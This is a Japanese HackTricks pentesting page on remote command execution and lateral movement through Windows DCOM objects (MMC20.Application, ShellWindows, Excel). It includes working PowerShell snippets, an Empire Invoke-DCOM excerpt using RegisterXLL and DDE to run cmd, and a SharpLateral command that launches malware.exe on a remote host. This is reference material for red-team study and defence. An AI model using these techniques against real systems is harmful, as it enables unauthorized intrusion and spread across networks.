# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで企業を宣伝**したいですか？または、**最新バージョンのPEASSにアクセス**したいですか、またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* [**公式PEASS＆HackTricksのスウェグ**](https://peass.creator-spring.com)を手に入れましょう
* **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に**参加**するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**私をフォロー**する**🐦**[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正を迅速化します。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今日。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

分散コンポーネントオブジェクトモデル（DCOM）オブジェクトは、オブジェクトとのネットワークベースのやり取りに興味深い機能を提供します。Microsoftは、DCOMとComponent Object Model（COM）の包括的なドキュメントを提供しており、[DCOMの場合はこちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)、[COMの場合はこちら](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) でアクセスできます。PowerShellコマンドを使用してDCOMアプリケーションのリストを取得できます：
```bash
Get-CimInstance Win32_DCOMApplication
```
COMオブジェクト、[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)は、MMCスナップイン操作のスクリプト化を可能にします。特に、このオブジェクトには`Document.ActiveView`の下に`ExecuteShellCommand`メソッドが含まれています。このメソッドに関する詳細情報は[こちら](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)で確認できます。次のコマンドを実行して確認します：

この機能は、DCOMアプリケーションを介してネットワーク上でコマンドを実行することを容易にします。管理者としてリモートでDCOMとやり取りするために、PowerShellを以下のように利用できます：
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドはDCOMアプリケーションに接続し、COMオブジェクトのインスタンスを返します。その後、ExecuteShellCommandメソッドを呼び出してリモートホストでプロセスを実行できます。プロセスは以下の手順で行われます：

メソッドのチェック:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCEを取得します。
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
詳細については、[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)を参照してください。

## ShellWindows＆ShellBrowserWindow

**MMC20.Application**オブジェクトは、明示的な「LaunchPermissions」が不足していることが特定され、管理者がアクセスできる権限を許可するデフォルトの権限になっています。詳細については、[こちら](https://twitter.com/tiraniddo/status/817532039771525120)のスレッドを探索することができ、[@tiraniddo](https://twitter.com/tiraniddo)のOleView .NETを使用して、明示的なLaunch Permissionがないオブジェクトをフィルタリングすることが推奨されています。

`ShellBrowserWindow`と`ShellWindows`という2つの特定のオブジェクトが、明示的なLaunch Permissionsがないことが強調されました。`HKCR:\AppID\{guid}`の下に`LaunchPermission`レジストリエントリが存在しない場合、明示的な権限がないことを示します。

### ShellWindows
`ShellWindows`にはProgIDがないため、.NETメソッドの`Type.GetTypeFromCLSID`と`Activator.CreateInstance`を使用して、そのAppIDを使用してオブジェクトのインスタンス化を容易にします。このプロセスでは、OleView .NETを使用して`ShellWindows`のCLSIDを取得します。インスタンス化されると、`WindowsShell.Item`メソッドを介して対話が可能になり、`Document.Application.ShellExecute`のようなメソッドの呼び出しが行われます。

オブジェクトをインスタンス化し、リモートでコマンドを実行するための例として、PowerShellコマンドが提供されました。
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Excel DCOMオブジェクトを使用した横方向移動

DCOM Excelオブジェクトを悪用することで、横方向の移動が可能です。詳細情報については、[Cybereasonのブログ](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)でExcel DDEを介したDCOM経由の横方向移動に関する議論を読むことをお勧めします。

Empireプロジェクトは、Excelを使用してDCOMオブジェクトを操作することでリモートコード実行（RCE）を実証するPowerShellスクリプトを提供しています。以下は、ExcelをRCEに悪用するためのさまざまな方法を示す、[EmpireのGitHubリポジトリ](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)のスクリプトからのスニペットです：
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### レータルムーブメントのための自動化ツール

これらのテクニックを自動化するために2つのツールが強調されています：

- **Invoke-DCOM.ps1**: Empireプロジェクトによって提供されたPowerShellスクリプトで、リモートマシンでコードを実行するためのさまざまなメソッドの呼び出しを簡素化します。このスクリプトはEmpire GitHubリポジトリでアクセスできます。

- **SharpLateral**: コードをリモートで実行するために設計されたツールで、次のコマンドと共に使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 自動ツール

* Powershellスクリプト[**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1)は、他のマシンでコードを実行するためのすべてのコメント付き方法を簡単に呼び出すことができます。
* [**SharpLateral**](https://github.com/mertdas/SharpLateral)も使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 参考

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

重要な脆弱性を見つけて素早く修正できるようにしましょう。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリケーション、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学びましょう</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つけてください
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**をフォローしてください。**
* **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、**ハッキングトリックを共有**してください。

</details>
